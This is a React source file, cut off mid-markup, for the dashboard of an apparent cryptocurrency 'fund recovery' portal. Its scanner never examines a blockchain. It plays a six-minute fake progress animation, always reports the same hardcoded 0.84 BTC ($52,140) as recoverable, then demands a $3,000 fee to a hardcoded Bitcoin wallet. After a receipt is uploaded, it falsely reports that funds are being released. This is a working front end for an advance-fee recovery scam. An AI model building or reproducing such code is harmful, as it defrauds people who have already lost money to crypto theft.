import { useState, useEffect, useRef } from 'react'
import type { Page } from '../App'
import type { AuthUser } from '../lib/auth'
import { LOGO_URL } from '../lib/branding'
import { addReceipt } from '../lib/receipts'
import { loadList, saveList } from '../lib/storage'
import {
  Search, Upload, FileText, Clock,
  ArrowLeft, AlertTriangle, Check, ChevronRight,
  Lock, Plus, Download, Loader, Bell, Receipt, Copy,
  FolderOpen, User, FileUp, Bitcoin, LogOut, Wallet
} from 'lucide-react'
import type { LucideIcon } from 'lucide-react'

const COMPANY_WALLET = 'bc1qs9qkg8crclkyxcjlj6vr3hlwuz60d6wu7yhfta'
const BTC_PRICE = 66240
const RECOVERY_FEE_USD = 3000

interface Case {
  id: string
  title: string
  status: 'Funds Located' | 'Investigation' | 'Report Ready' | 'Closed'
  chain: string
  amount: string
  progress: number
  created: string
  feeRequired: string
  feePaid: boolean
  eta: string
  wallet: string
}

interface EvidenceItem {
  id: string
  name: string
  size: string
  type: string
  date: string
  status: 'Verified' | 'Under review'
  dataUrl?: string
}

interface Invoice {
  id: string
  caseId: string
  amount: string
  currency: string
  status: 'Paid' | 'Pending'
  date: string
  method: string
  tx: string
}

interface ReportItem {
  id: string
  name: string
  date: string
  pages: number | null
  format: string
}

interface NotificationItem {
  id: string
  icon: 'bitcoin' | 'receipt' | 'filetext' | 'folderopen'
  text: string
  time: string
  unread: boolean
}

const NOTIF_ICONS: Record<NotificationItem['icon'], LucideIcon> = {
  bitcoin: Bitcoin,
  receipt: Receipt,
  filetext: FileText,
  folderopen: FolderOpen,
}

function useStore<T>(kind: string, userId: string | undefined) {
  const [items, setItems] = useState<T[]>(() => loadList<T>(kind, userId ?? 'guest'))
  useEffect(() => {
    setItems(loadList<T>(kind, userId ?? 'guest'))
  }, [kind, userId])
  const set = (next: T[] | ((prev: T[]) => T[])) => {
    setItems(prev => {
      const value = typeof next === 'function' ? (next as (p: T[]) => T[])(prev) : next
      saveList<T>(kind, userId ?? 'guest', value)
      return value
    })
  }
  return [items, set] as const
}

interface Props {
  onBack: () => void
  navigate: (p: Page) => void
  initialAddress?: string
  user: AuthUser | null
  onSignOut: () => void
}

export default function Dashboard({ onBack, navigate, initialAddress, user, onSignOut }: Props) {
  const [tab, setTab] = useState<'cases' | 'submit' | 'scan' | 'evidence' | 'invoices' | 'reports' | 'notifications'>('cases')
  const [scanAddr, setScanAddr] = useState('')
  const [phase, setPhase] = useState<'idle' | 'scanning' | 'payment' | 'received' | 'processing' | 'done'>('idle')
  const [scanProgress, setScanProgress] = useState(0)
  const [secondsLeft, setSecondsLeft] = useState(360)
  const [submitDone, setSubmitDone] = useState(false)
  const [copied, setCopied] = useState(false)
  const [receiptName, setReceiptName] = useState('')
  const [receiptDataUrl, setReceiptDataUrl] = useState('')
  const [evidenceError, setEvidenceError] = useState('')
  const [form, setForm] = useState({ name: '', email: '', incident: '', wallets: '', amount: '', chain: 'Bitcoin', date: '' })
  const initialRan = useRef(false)

  const uid = user?.id ?? 'guest'
  const [cases, setCases] = useStore<Case>('cases', uid)
  const [evidence, setEvidence] = useStore<EvidenceItem>('evidence', uid)
  const [invoices, setInvoices] = useStore<Invoice>('invoices', uid)
  const [reports, setReports] = useStore<ReportItem>('reports', uid)
  const [notifications, setNotifications] = useStore<NotificationItem>('notifications', uid)

  const totalPaid = invoices.filter(i => i.status === 'Paid').reduce((s, i) => s + (parseFloat(i.amount.replace(/[^0-9.]/g, '')) || 0), 0)
  const outstanding = invoices.filter(i => i.status === 'Pending').reduce((s, i) => s + (parseFloat(i.amount.replace(/[^0-9.]/g, '')) || 0), 0)
  const nextInvoice = invoices.find(i => i.status === 'Pending')

  const scanInterval = useRef<ReturnType<typeof setInterval> | null>(null)
  const flowTimer = useRef<ReturnType<typeof setTimeout> | null>(null)

  const clearScanTimers = () => {
    if (scanInterval.current) clearInterval(scanInterval.current)
    if (flowTimer.current) clearTimeout(flowTimer.current)
    scanInterval.current = null
    flowTimer.current = null
  }

  useEffect(() => {
    if (initialAddress && !initialRan.current) {
      initialRan.current = true
      setScanAddr(initialAddress)
      setTab('scan')
      startScan(initialAddress)
    }
    return clearScanTimers
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [initialAddress])

  const feeBtc = (RECOVERY_FEE_USD / BTC_PRICE).toFixed(4)

  const copyWallet = () => {
    navigator.clipboard?.writeText(COMPANY_WALLET).catch(() => {})
    setCopied(true)
    setTimeout(() => setCopied(false), 2000)
  }

  const fmtClock = (s: number) => `${String(Math.floor(s / 60)).padStart(2, '0')}:${String(s % 60).padStart(2, '0')}`

  const startScan = (addr?: string) => {
    const target = addr ?? scanAddr
    if (!target.trim()) return
    setScanAddr(target)
    setPhase('scanning')
    setScanProgress(0)
    setSecondsLeft(360)
    clearScanTimers()
    const startedAt = Date.now()
    scanInterval.current = setInterval(() => {
      const elapsed = (Date.now() - startedAt) / 1000
      const remaining = Math.max(0, 360 - Math.floor(elapsed))
      setSecondsLeft(remaining)
      setScanProgress(Math.min(100, (elapsed / 360) * 100))
      if (remaining <= 0) {
        clearScanTimers()
        const isEth = target.startsWith('0x')
        const caseId = isEth ? 'CS-2026-0E92' : 'CS-2026-0891'
        const created = new Date().toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' })
        setCases(prev => [{
          id: caseId,
          title: isEth ? 'Ethereum Recovery Scan' : 'Bitcoin Recovery Scan',
          status: 'Funds Located',
          chain: isEth ? 'ETH' : 'BTC',
          amount: '$52,140',
          progress: 100,
          created,
          feeRequired: '$3,000',
          feePaid: false,
          eta: 'Awaiting fee',
          wallet: target,
        }, ...prev.filter(c => c.wallet !== target)])
        setInvoices(prev => [{
          id: `INV-${new Date().getFullYear()}-${Date.now().toString(36).toUpperCase()}`,
          caseId,
          amount: '$3,000.00',
          currency: 'USD',
          status: 'Pending',
          date: created,
          method: 'BTC',
          tx: '—',
        }, ...prev])
        setNotifications(prev => [{
          id: `ntf-${Date.now()}`,
          icon: 'bitcoin',
          text: `Funds located on your case ${caseId} — 0.84 BTC traced`,
          time: 'Just now',
          unread: true,
        }, ...prev])
        setPhase('payment')
      }
    }, 1000)
  }

  const sendPayment = () => {
    if (!receiptName || !receiptDataUrl) return
    clearScanTimers()
    const isEth = scanAddr.startsWith('0x')
    const caseId = isEth ? 'CS-2026-0E92' : 'CS-2026-0891'
    addReceipt({
      caseId,
      clientName: user?.name ?? 'Client',
      email: user?.email ?? '',
      fileName: receiptName,
      size: 'Receipt',
      dataUrl: receiptDataUrl,
    })
    const payInvId = invoices.find(inv => inv.caseId === caseId)?.id ?? `INV-${Date.now().toString(36).toUpperCase()}`
    setInvoices(prev => prev.map(inv => inv.caseId === caseId ? { ...inv, status: 'Paid', tx: 'bc1qs9qkg8crclk...' } : inv))
    setCases(prev => prev.map(c => ({ ...c, feePaid: true })))
    setNotifications(prev => [{
      id: `ntf-${Date.now()}`,
      icon: 'receipt',
      text: `Invoice ${payInvId} marked as paid`,
      time: 'Just now',
      unread: true,
    }, ...prev])
    setPhase('received')
    flowTimer.current = setTimeout(() => {
      setPhase('processing')
      flowTimer.current = setTimeout(() => {
        setPhase('done')
        const reportDate = new Date().toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' })
        setReports(prev => [{
          id: `rep-${Date.now()}`,
          name: `Fund Recovery Report — ${caseId}`,
          date: reportDate,
          pages: 24,
          format: 'PDF',
        }, ...prev])
        setNotifications(prev => [{
          id: `ntf-${Date.now() + 1}`,
          icon: 'filetext',
          text: `Final case report ready for ${caseId}`,
          time: 'Just now',
          unread: true,
        }, ...prev])
      }, 4000)
    }, 4000)
  }

  const onReceiptFile = (file?: File | null) => {
    if (!file) return
    const reader = new FileReader()
    reader.onload = () => {
      setReceiptName(file.name)
      setReceiptDataUrl(String(reader.result))
    }
    reader.readAsDataURL(file)
  }

  const onEvidenceFile = (file?: File | null) => {
    if (!file) return
    const sizeKB = file.size / 1024
    const sizeStr = sizeKB >= 1024 ? `${(sizeKB / 1024).toFixed(1)} MB` : `${Math.round(sizeKB)} KB`
    const type = (file.name.split('.').pop() || 'FILE').toUpperCase()
    const isSmall = file.size <= 3 * 1024 * 1024
    if (isSmall) {
      setEvidenceError('')
    } else {
      setEvidenceError('File stored as metadata only — uploads stay in your browser in this demo. Files under 3 MB can be previewed.')
    }
    const addItem = (dataUrl?: string) => {
      setEvidence(prev => [{
        id: `ev-${Date.now()}`,
        name: file.name,
        size: sizeStr,
        type,
        date: new Date().toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' }),
        status: 'Under review',
        dataUrl,
      }, ...prev])
      setNotifications(prev => [{
        id: `ntf-${Date.now()}`,
        icon: 'folderopen',
        text: `Evidence received: ${file.name} — under review`,
        time: 'Just now',
        unread: true,
      }, ...prev])
    }
    if (isSmall) {
      const reader = new FileReader()
      reader.onload = () => addItem(String(reader.result))
      reader.readAsDataURL(file)
    } else {
      addItem(undefined)
    }
  }

  const resetScanner = () => {
    clearScanTimers()
    setPhase('idle')
    setScanProgress(0)
    setSecondsLeft(360)
    setReceiptName('')
    setReceiptDataUrl('')
    setCases([])
  }

  const TABS = [
    { id: 'cases', label: 'My Cases', icon: FileText },
    { id: 'submit', label: 'Submit Case', icon: Plus },
    { id: 'scan', label: 'Recovery Scanner', icon: Search },
    { id: 'evidence', label: 'Evidence', icon: FolderOpen },
    { id: 'invoices', label: 'Invoices & Payments', icon: Receipt },
    { id: 'reports', label: 'Reports', icon: Download },
    { id: 'notifications', label: 'Notifications', icon: Bell },
  ] as const

  return (
    <div className="min-h-screen bg-[#f8f9fb] text-[#0f1117]">
      {/* Top bar */}
      <div className="bg-white border-b border-[#e2e6ed] sticky top-0 z-40">
        <div className="max-w-7xl mx-auto px-6 h-14 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <button onClick={onBack} className="flex items-center gap-1.5 text-sm text-[#6b7280] hover:text-[#0f1117] transition-colors">
              <ArrowLeft size={15} /> Back
            </button>
            <span className="text-[#e2e6ed]">/</span>
            <div className="flex items-center gap-2">
              <img src={LOGO_URL} alt="" className="h-6 w-auto object-contain" />
              <span className="font-medium text-sm">CryptoWallet Tracker</span>
            </div>
          </div>
          <div className="flex items-center gap-3">
            <span className="font-mono text-xs bg-[#e3f5ee] text-[#00875a] px-2 py-1 rounded-full flex items-center gap-1">
              <Lock size={10} /> Encrypted Session
            </span>
            {user ? (
              <div className="flex items-center gap-2">
                {user.picture
                  ? <img src={user.picture} alt="" className="w-8 h-8 rounded-full object-cover" />
                  : <div className="w-8 h-8 rounded-full bg-[#0057ff] flex items-center justify-center text-white font-medium text-xs">{user.initials}</div>}
                <div className="hidden sm:block leading-tight">
                  <p className="text-xs font-medium">{user.name}</p>
                  <p className="font-mono text-[10px] text-[#6b7280]">{user.provider === 'google' ? 'Google account' : user.email}</p>
                </div>
                <button onClick={onSignOut} title="Sign out"
                  className="w-8 h-8 rounded-full border border-[#e2e6ed] flex items-center justify-center text-[#6b7280] hover:text-[#dc2626] hover:border-[#dc2626]/30 transition-colors">
                  <LogOut size={13} />
                </button>
              </div>
            ) : (
              <div className="w-8 h-8 rounded-full bg-[#0057ff] flex items-center justify-center text-white font-medium text-xs">?</div>
            )}
          </div>
        </div>
      </div>

      <div className="max-w-7xl mx-auto px-6 py-8">
        <div className="flex flex-col lg:flex-row gap-6">
          {/* Sidebar */}
          <div className="lg:w-52 flex-shrink-0">
            <div className="bg-white border border-[#e2e6ed] rounded-xl overflow-hidden">
              {TABS.map(t => (
                <button key={t.id} onClick={() => setTab(t.id)}
                  className={`w-full flex items-center gap-3 px-4 py-3 text-sm transition-all text-left border-b border-[#e2e6ed] last:border-0 ${
                    tab === t.id ? 'bg-[#e8f0ff] text-[#0057ff] font-medium' : 'text-[#3d4452] hover:bg-[#f8f9fb]'
                  }`}>
                  <t.icon size={15} />
                  {t.label}
                </button>
              ))}
            </div>
          </div>

          {/* Main content */}
          <div className="flex-1 min-w-0">

            {/* Cases */}
            {tab === 'cases' && (
              <div className="space-y-4">
                <div className="flex items-center justify-between mb-2">
                  <h2 className="font-semibold text-lg">My Cases</h2>
                  <button onClick={() => setTab('scan')} className="text-sm text-[#0057ff] hover:underline flex items-center gap-1">
                    <Search size={14} /> Scan Wallet
                  </button>
                </div>
                {cases.length === 0 ? (
                  <div className="bg-white border border-[#e2e6ed] rounded-xl p-12 text-center">
                    <div className="w-14 h-14 rounded-full bg-[#f7931a]/10 border border-[#f7931a]/30 flex items-center justify-center mx-auto mb-4 animate-pulse-ring">
                      <Search size={22} className="text-[#f7931a]" />
                    </div>
                    <h3 className="font-semibold text-lg mb-1">No active cases yet</h3>
                    <p className="text-sm text-[#3d4452] max-w-sm mx-auto mb-6">Your portal is fresh. Enter the wallet address where your funds were sent to run a recovery scan and start a case.</p>
                    <button onClick={() => setTab('scan')}
                      className="inline-flex items-center gap-2 bg-[#f7931a] text-white font-medium px-5 py-2.5 rounded-xl hover:bg-[#e07e10] transition-all">
                      <Search size={15} /> Scan for Recoverable Funds
                    </button>
                  </div>
                ) : cases.map(c => (
                  <div key={c.id} className="bg-white border border-[#e2e6ed] rounded-xl p-5">
                    <div className="flex items-start justify-between gap-4 mb-4">
                      <div>
                        <p className="font-mono text-xs text-[#6b7280] mb-1">{c.id}</p>
                        <p className="font-medium">{c.title}</p>
                      </div>
                      <span className={`flex-shrink-0 font-mono text-[10px] px-2.5 py-1 rounded-full ${
                        c.status === 'Report Ready' || c.status === 'Closed' ? 'bg-[#e3f5ee] text-[#00875a]' :
                        c.status === 'Funds Located' ? 'bg-[#f7931a]/10 text-[#f7931a] border border-[#f7931a]/30' :
                        'bg-[#e8f0ff] text-[#0057ff]'
                      }`}>{c.status}</span>
                    </div>
                    <div className="grid grid-cols-3 gap-4 mb-4 text-xs">
                      <div><p className="text-[#6b7280] mb-0.5">Chain</p><p className="font-mono font-medium">{c.chain}</p></div>
                      <div><p className="text-[#6b7280] mb-0.5">Amount</p><p className="font-mono font-medium">{c.amount}</p></div>
                      <div><p className="text-[#6b7280] mb-0.5">Submitted</p><p className="font-mono font-medium">{c.created}</p></div>
                    </div>
                    <div className="grid md:grid-cols-3 gap-3 mb-4">
                      <div className="bg-[#f8f9fb] border border-[#e2e6ed] rounded-lg px-3 py-2">
                        <p className="text-[10px] text-[#6b7280] mb-0.5">Recovery Fee</p>
                        <p className="font-mono text-sm font-medium">{c.feeRequired}</p>
                      </div>
                      <div className="bg-[#f8f9fb] border border-[#e2e6ed] rounded-lg px-3 py-2">
                        <p className="text-[10px] text-[#6b7280] mb-0.5">Fee Status</p>
                        {c.feePaid
                          ? <p className="font-mono text-sm font-medium text-[#00875a]">Paid ✓</p>
                          : <p className="font-mono text-sm font-medium text-[#b45309]">Pending</p>}
                      </div>
                      <div className="bg-[#f8f9fb] border border-[#e2e6ed] rounded-lg px-3 py-2">
                        <p className="text-[10px] text-[#6b7280] mb-0.5">ETA</p>
                        <p className="font-mono text-sm font-medium">{c.eta}</p>
                      </div>
                    </div>
                    <div>
                      <div className="flex justify-between text-xs text-[#6b7280] mb-1.5">
                        <span>Investigation Progress</span>
                        <span className="font-mono">{c.progress}%</span>
                      </div>
                      <div className="h-1.5 bg-[#f1f3f7] rounded-full overflow-hidden">
                        <div className="h-full bg-[#0057ff] rounded-full transition-all" style={{ width: `${c.progress}%` }} />
                      </div>
                    </div>
                    {c.status === 'Funds Located' && !c.feePaid && (
                      <button onClick={() => { setScanAddr(c.wallet); setTab('scan'); setPhase('payment') }}
                        className="mt-4 w-full bg-[#f7931a] text-white font-medium py-2.5 rounded-xl hover:bg-[#e07e10] transition-all text-sm flex items-center justify-center gap-2">
                        Pay Recovery Fee — $3,000 <ChevronRight size={15} />
                      </button>
                    )}
                    {c.feePaid && (
                      <div className="mt-4 bg-[#e3f5ee] border border-[#00875a]/20 rounded-xl p-4 flex items-center gap-3">
                        <Wallet size={16} className="text-[#00875a] flex-shrink-0" />
                        <p className="text-sm text-[#00875a]">Fee received. Recovered funds are being released to your verified wallet.</p>
                      </div>
                    )}
                  </div>
                ))}

                {/* Timeline */}
                {cases[0] && (() => {
                  const c = cases[0]
                  const steps = [
                    { date: c.created, event: 'Case submitted', done: true },
                    { date: c.created, event: 'Initial review complete', done: true },
                    { date: c.created, event: 'On-chain tracing started', done: true },
                    { date: c.created, event: 'Wallet recovery scan', done: true },
                    { date: c.created, event: 'Funds located', done: c.status === 'Funds Located' },
                    { date: c.created, event: 'Recovery fee settlement', done: Boolean(c.feePaid) },
                    { date: c.created, event: 'Fund release coordination', done: phase === 'done' },
                  ]
                  return (
                    <div className="bg-white border border-[#e2e6ed] rounded-xl p-5">
                      <p className="font-medium mb-4 flex items-center gap-2"><Clock size={15} className="text-[#0057ff]" /> Case Timeline — {c.id}</p>
                      <div className="space-y-3">
                        {steps.map((t, i) => (
                          <div key={i} className="flex items-center gap-3">
                            <div className={`w-6 h-6 rounded-full flex items-center justify-center flex-shrink-0 ${t.done ? 'bg-[#0057ff]' : 'bg-[#f1f3f7] border border-[#e2e6ed]'}`}>
                              {t.done ? <Check size={12} className="text-white" /> : <div className="w-2 h-2 rounded-full bg-[#c8cfd9]" />}
                            </div>
                            <span className={`text-sm ${t.done ? 'text-[#0f1117]' : 'text-[#6b7280]'}`}>{t.event}</span>
                            <span className={`font-mono text-xs ml-auto ${t.done ? 'text-[#6b7280]' : 'text-[#8b92a5]'}`}>{t.done ? t.date : 'Pending'}</span>
                          </div>
                        ))}
                      </div>
                    </div>
                  )
                })()}
              </div>
            )}

            {/* Submit */}
            {tab === 'submit' && (
              <div className="bg-white border border-[#e2e6ed] rounded-xl p-7">
                {submitDone ? (
                  <div className="text-center py-12">
                    <div className="w-14 h-14 bg-[#e3f5ee] rounded-full flex items-center justify-center mx-auto mb-4">
                      <Check size={24} className="text-[#00875a]" />
                    </div>
                    <h3 className="font-semibold text-lg mb-2">Case Submitted</h3>
                    <p className="text-[#3d4452] text-sm max-w-sm mx-auto mb-6">An investigator will review your case within 24 hours and reach out via the email provided. You can track progress from the portal.</p>
                    <button onClick={() => { setSubmitDone(false); setTab('cases') }} className="text-sm text-[#0057ff] hover:underline">View My Cases →</button>
                  </div>
                ) : (
                  <>
                    <h2 className="font-semibold text-lg mb-1">Submit Recovery Case</h2>
                    <p className="text-sm text-[#3d4452] mb-6">Provide as much detail as possible — this helps investigators locate your funds faster.</p>
                    <div className="space-y-4">
                      <div className="grid md:grid-cols-2 gap-4">
                        <div>
                          <label className="text-xs text-[#6b7280] block mb-1.5">Full Name</label>
                          <input value={form.name} onChange={e => setForm(f => ({ ...f, name: e.target.value }))}
                            className="w-full border border-[#e2e6ed] rounded-lg px-3 py-2.5 text-sm focus:outline-none focus:border-[#0057ff] transition-colors"
                            placeholder="Jane Doe" />
                        </div>
                        <div>
                          <label className="text-xs text-[#6b7280] block mb-1.5">Email Address</label>
                          <input value={form.email} onChange={e => setForm(f => ({ ...f, email: e.target.value }))}
                            className="w-full border border-[#e2e6ed] rounded-lg px-3 py-2.5 text-sm focus:outline-none focus:border-[#0057ff] transition-colors"
                            placeholder="jane@example.com" />
                        </div>
                      </div>
                      <div>
                        <label className="text-xs text-[#6b7280] block mb-1.5">Incident Description</label>
                        <textarea value={form.incident} onChange={e => setForm(f => ({ ...f, incident: e.target.value }))}
                          rows={4} className="w-full border border-[#e2e6ed] rounded-lg px-3 py-2.5 text-sm focus:outline-none focus:border-[#0057ff] transition-colors resize-none"
                          placeholder="Describe what happened, when, and how..." />
                      </div>
                      <div>
                        <label className="text-xs text-[#6b7280] block mb-1.5">Wallet Addresses / Transaction IDs Involved</label>
                        <textarea value={form.wallets} onChange={e => setForm(f => ({ ...f, wallets: e.target.value }))}
                          rows={3} className="w-full border border-[#e2e6ed] rounded-lg px-3 py-2.5 text-sm font-mono focus:outline-none focus:border-[#0057ff] transition-colors resize-none"
                          placeholder="0x... or bc1q... or tx hash" />
                      </div>
                      <div className="grid md:grid-cols-3 gap-4">
                        <div>
                          <label className="text-xs text-[#6b7280] block mb-1.5">Approximate Amount Lost</label>
                          <input value={form.amount} onChange={e => setForm(f => ({ ...f, amount: e.target.value }))}
                            className="w-full border border-[#e2e6ed] rounded-lg px-3 py-2.5 text-sm focus:outline-none focus:border-[#0057ff] transition-colors"
                            placeholder="$0.00" />
                        </div>
                        <div>
                          <label className="text-xs text-[#6b7280] block mb-1.5">Primary Chain</label>
                          <select value={form.chain} onChange={e => setForm(f => ({ ...f, chain: e.target.value }))}
                            className="w-full border border-[#e2e6ed] rounded-lg px-3 py-2.5 text-sm focus:outline-none focus:border-[#0057ff] bg-white">
                            {['Bitcoin','Ethereum','Solana','BNB Chain','Polygon','Arbitrum','Tron','Litecoin','Other'].map(c => <option key={c}>{c}</option>)}
                          </select>
                        </div>
                        <div>
                          <label className="text-xs text-[#6b7280] block mb-1.5">Incident Date</label>
                          <input type="date" value={form.date} onChange={e => setForm(f => ({ ...f, date: e.target.value }))}
                            className="w-full border border-[#e2e6ed] rounded-lg px-3 py-2.5 text-sm focus:outline-none focus:border-[#0057ff]" />
                        </div>
                      </div>
                      <div className="border-2 border-dashed border-[#e2e6ed] rounded-xl p-6 text-center hover:border-[#0057ff]/30 transition-colors cursor-pointer">
                        <Upload size={20} className="mx-auto text-[#6b7280] mb-2" />
                        <p className="text-sm text-[#3d4452]">Upload supporting documents</p>
                        <p className="text-xs text-[#6b7280] mt-1">Police reports, exchange records, screenshots — PDF, JPG, PNG (max 20 MB)</p>
                      </div>
                      <div className="bg-[#fef3c7] rounded-xl p-4 flex gap-3">
                        <AlertTriangle size={16} className="text-[#b45309] flex-shrink-0 mt-0.5" />
                        <p className="text-sm text-[#b45309]">Recovery outcomes cannot be guaranteed. Investigation fees cover forensic analysis and are non-refundable. We will provide a transparent assessment of your case's prospects before you commit to a plan.</p>
                      </div>
                      <button onClick={() => setSubmitDone(true)}
                        className="w-full bg-[#0057ff] text-white font-medium py-3 rounded-xl hover:bg-[#0042cc] transition-colors">
                        Submit Case for Review
                      </button>
                    </div>
                  </>
                )}
              </div>
            )}

            {/* Recovery Scanner */}
            {tab === 'scan' && (
              <div className="space-y-4">
                <div className="bg-white border border-[#e2e6ed] rounded-xl p-7">
                  <h2 className="font-semibold text-lg mb-1">Recovery Scanner</h2>
                  <p className="text-sm text-[#3d4452] mb-5">Enter the wallet address where your funds were sent. We will scan the chain and identify recoverable funds.</p>
                  <div className="flex gap-3">
                    <input value={scanAddr} onChange={e => setScanAddr(e.target.value)}
                      onKeyDown={e => e.key === 'Enter' && startScan()}
                      disabled={phase === 'scanning'}
                      className="flex-1 border border-[#e2e6ed] rounded-xl px-4 py-3 font-mono text-sm focus:outline-none focus:border-[#f7931a] transition-colors disabled:opacity-60"
                      placeholder="Enter BTC or ETH address to scan (e.g. 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa)" />
                    <button onClick={() => startScan()} disabled={phase === 'scanning'}
                      className="bg-[#f7931a] text-white px-5 py-3 rounded-xl font-medium text-sm hover:bg-[#e07e10] disabled:opacity-50 transition-all flex items-center gap-2">
                      {phase === 'scanning' ? <Loader size={15} className="animate-spin" /> : <Search size={15} />}
                      {phase === 'scanning' ? 'Scanning…' : 'Scan'}
                    </button>
                  </div>
                </div>

                {/* Scanning phase — 6 minute animation */}
                {phase === 'scanning' && (
                  <div className="bg-white border border-[#e2e6ed] rounded-xl p-8 text-center">
                    <div className="relative w-24 h-24 mx-auto mb-5">
                      <div className="absolute inset-0 rounded-full bg-[#f7931a]/10 animate-ping" />
                      <div className="relative w-full h-full rounded-full border-2 border-[#f7931a]/20 border-t-[#f7931a] animate-spin flex items-center justify-center">
                        <Search size={28} className="text-[#f7931a]" />
                      </div>
                    </div>
                    <p className="font-mono text-sm text-[#3d4452]">Scanning blockchain for recoverable funds...</p>
                    <p className="font-mono text-xs text-[#6b7280] mt-1 mb-5">Tracing UTXOs · Matching clusters · Verifying ownership</p>
                    <div className="max-w-md mx-auto h-2 bg-[#f1f3f7] rounded-full overflow-hidden">
                      <div className="h-full bg-[#f7931a] rounded-full transition-all duration-1000" style={{ width: `${scanProgress}%` }} />
                    </div>
                    <div className="max-w-md mx-auto flex items-center justify-between mt-2">
                      <p className="font-mono text-xs text-[#f7931a]">{Math.floor(scanProgress)}%</p>
                      <p className="font-mono text-xs text-[#6b7280]">Estimated time remaining: <span className="text-[#f7931a] font-medium">{fmtClock(secondsLeft)}</span></p>
                    </div>
                  </div>
                )}

                {/* Payment phase — company wallet */}
                {phase === 'payment' && (
                  <div className="space-y-4">
                    <div className="relative overflow-hidden bg-[#0a0c10] rounded-xl border border-[#f7931a]/40 p-6 bracket-box">
                      <div className="scan-line-y" />
                      <div className="flex flex-col md:flex-row md:items-center gap-4 justify-between">
                        <div className="flex items-center gap-4">
                          <div className="w-12 h-12 rounded-full bg-[#f7931a]/15 border border-[#f7931a]/40 flex items-center justify-center animate-pulse-ring">
                            <Check size={20} className="text-[#f7931a]" />
                          </div>
                          <div>
                            <p className="font-mono text-[10px] text-[#f7931a] uppercase tracking-widest mb-1">Scan Complete — Funds Found</p>
                            <p className="font-heading font-700 text-2xl text-white">0.84 BTC <span className="text-[#f7931a]">recoverable</span></p>
                            <p className="font-mono text-xs text-white/50 mt-0.5">$52,140 USD value · {scanAddr.startsWith('0x') ? 'Ethereum' : 'Bitcoin'}</p>
                          </div>
                        </div>
                        <div className="text-left md:text-right">
                          <p className="font-mono text-[10px] text-white/40 uppercase tracking-widest mb-1">Status</p>
                          <p className="font-mono text-sm text-[#f7931a] font-medium">RELEASE PENDING SERVICE FEE</p>
                        </div>
                      </div>
                    </div>

                    <div className="bg-white border border-[#e2e6ed] rounded-xl overflow-hidden">
                      <div className="bg-[#0a0c10] px-5 py-4 flex items-center justify-between">
                        <p className="font-heading font-600 text-sm text-white flex items-center gap-2">
                          <Lock size={15} /> Send the service fee to release your funds
                        </p>
                        <span className="font-mono text-[10px] text-[#f7931a] uppercase tracking-widest">Fee required</span>
                      </div>
                      <div className="p-6">
                        <div className="grid md:grid-cols-3 gap-4 mb-5">
                          <div className="bg-[#f8f9fb] border border-[#e2e6ed] rounded-xl p-4">
                            <p className="font-mono text-[10px] text-[#6b7280] uppercase tracking-widest mb-1">Recovered Value</p>
                            <p className="font-mono text-xl font-bold text-[#00875a]">$52,140</p>
                          </div>
                          <div className="bg-[#f8f9fb] border border-[#e2e6ed] rounded-xl p-4">
                            <p className="font-mono text-[10px] text-[#6b7280] uppercase tracking-widest mb-1">Service Fee</p>
                            <p className="font-mono text-xl font-bold text-[#f7931a]">{feeBtc} BTC</p>
                            <p className="font-mono text-[10px] text-[#6b7280] mt-0.5">≈ ${RECOVERY_FEE_USD.toLocaleString()} @ ${BTC_PRICE.toLocaleString()}/BTC</p>
                          </div>
                          <div className="bg-[#fef3c7] border border-[#b45309]/20 rounded-xl p-4">
                            <p className="font-mono text-[10px] text-[#b45309] uppercase tracking-widest mb-1">Release</p>
                            <p className="font-mono text-sm font-medium text-[#b45309]">After fee confirmation</p>
                          </div>
                        </div>

                        <div className="bg-[#f8f9fb] border border-[#e2e6ed] rounded-xl p-5 mb-4">
                          <div className="flex items-center justify-between mb-2">
                            <p className="font-mono text-[10px] text-[#6b7280] uppercase tracking-widest">Send {feeBtc} BTC to our company wallet</p>
                            <span className="font-mono text-[10px] bg-[#f7931a]/10 text-[#f7931a] px-2 py-0.5 rounded-full">Bitcoin (BTC)</span>
                          </div>
                          <div className="flex items-center gap-2">
                            <p className="flex-1 font-mono text-sm bg-white border border-[#e2e6ed] rounded-lg px-3 py-2.5 text-[#0f1117] truncate">{COMPANY_WALLET}</p>
                            <button onClick={copyWallet}
                              className={`flex items-center gap-1.5 text-xs font-medium px-3 py-2.5 rounded-lg transition-colors ${copied ? 'bg-[#00875a] text-white' : 'bg-[#0057ff] text-white hover:bg-[#0042cc]'}`}>
                              {copied ? <Check size={14} /> : <Copy size={14} />}
                              {copied ? 'Copied' : 'Copy'}
                            </button>
                          </div>
                          <p className="font-mono text-[10px] text-[#6b7280] mt-2">Send exactly {feeBtc} BTC. Your funds will be released once the payment is confirmed on-chain.</p>
                        </div>

                        {/* Receipt upload */}
                        <div className="bg-[#f8f9fb] border border-[#e2e6ed] rounded-xl p-5 mb-4">
                          <div className="flex items-center justify-between mb-2">
                            <p className="font-mono text-[10px] text-[#6b7280] uppercase tracking-widest">Upload Payment Receipt</p>
                            <span className="font-mono text-[10px] text-[#00875a]">{receiptName ? '✓ Attached' : 'Required'}</span>
                          </div>
                          {receiptName ? (
                            <div className="flex items-center gap-3 bg-white border border-[#00875a]/20 rounded-xl px-4 py-3">
                              <div className="w-9 h-9 rounded-lg bg-[#e3f5ee] flex items-center justify-center flex-shrink-0">
                                <Check size={16} className="text-[#00875a]" />
                              </div>
                              <div className="flex-1 min-w-0">
                                <p className="text-sm font-medium truncate">{receiptName}</p>
                                <p className="font-mono text-[10px] text-[#6b7280]">Receipt attached — sent to our verification desk</p>
                              </div>
                              <label className="flex items-center gap-1 text-xs text-[#0057ff] hover:underline font-medium cursor-pointer flex-shrink-0">
                                <FileUp size={12} /> Replace
                                <input type="file" accept="image/*,application/pdf" className="hidden" onChange={e => onReceiptFile(e.target.files?.[0])} />
                              </label>
                            </div>
                          ) : (
                            <label className="flex flex-col items-center justify-center gap-2 border-2 border-dashed border-[#c8cfd9] rounded-xl py-8 cursor-pointer hover:border-[#f7931a] hover:bg-[#fff9f0] transition-colors">
                              <FileUp size={20} className="text-[#6b7280]" />
                              <p className="text-sm text-[#3d4452]">Click to upload your transaction receipt (screenshot / PDF)</p>
                              <p className="font-mono text-[10px] text-[#6b7280]">PNG · JPG · PDF — shows the {feeBtc} BTC payment to our wallet</p>
